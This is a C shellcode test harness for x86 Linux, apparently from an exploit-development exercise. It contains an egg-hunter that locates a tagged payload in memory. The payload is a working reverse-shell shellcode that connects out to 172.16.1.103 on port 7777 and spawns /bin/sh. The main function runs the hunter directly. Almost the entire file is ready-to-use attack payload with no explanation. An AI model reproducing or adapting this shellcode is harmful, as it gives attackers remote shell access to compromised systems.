#include<stdio.h>
#include<string.h>

unsigned char exploitcode[] = \
"\x2a\x1b\x2a\x1b\x2a\x1b\x2a\x1b"
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x97\x6a\x66\x58\x6a\x02\x5b\x31\xc9\x51"
"\x66\x68\x1b\x61\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x03\x68\xac\x10\x01\x67\x66\x68\x1e"
"\x61\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x57\x5b\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
"\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

unsigned char code[] = \
"\x31\xd2\x31\xc9\xfc\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x2a\x1b\x2a\x1b\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}